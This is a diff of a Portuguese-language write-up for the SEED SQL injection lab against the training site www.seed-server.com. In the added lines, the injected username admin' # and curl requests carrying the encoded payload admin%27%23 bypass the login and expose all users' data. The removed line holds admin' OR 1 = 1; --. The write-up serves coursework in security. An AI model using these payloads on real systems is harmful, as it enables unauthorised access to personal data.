@@ -26,7 +26,7 @@ SELECT * FROM credentials WHERE Name = "Alice";
 
 ###  Task 2: SQL Injection Attack on SELECT Statement
 
-#### 2.1
+#### Task 2.1 - Login in adminstrator mode from webpage
 
 Aceder ao site "www.seed-server.com".
 
@@ -38,12 +38,31 @@ WHERE name= ’$input_uname’ and Password=’$hashed_pwd’";
 
 A password é hashed mas o nome não. Basta colocar admin e comentar a segunda parte, obtendo assim acesso às credenciais de todos os utilizadores
 
+```note
+username: admin' #
+```
+
 ![Task 2 a](../img/lab8task2a.png)
 
-#### 2.2
+#### Task 2.2 - Login in adminstrator mode from command line
 
+Usamos o mesmo comando mas através de um pedido GET. Um exemplo seria:
 
+```bash
+curl "www.seed-server.com/unsafe_home.php?username=USER&Password=PASS"
+```
+
+Com o mesmo input da secção anterior, cifrado (%27 é plica, %23 é o hastag).
+
+```bash
+curl "http://www.seed-server.com/unsafe_home.php?username=admin%27%23&Password="
+```
+
+Com o comando anterior obtivemos o código HTML de toda a página que continha os dados pessoais dos utilizadores
+
+![Task 2 b](../img/lab8task2b.png)
+
+#### Task 2.3 - Append a new SQL statement
 
 ### Task 3: SQL Injection Attack on UPDATE Statement
 
-admin' OR 1 = 1; --
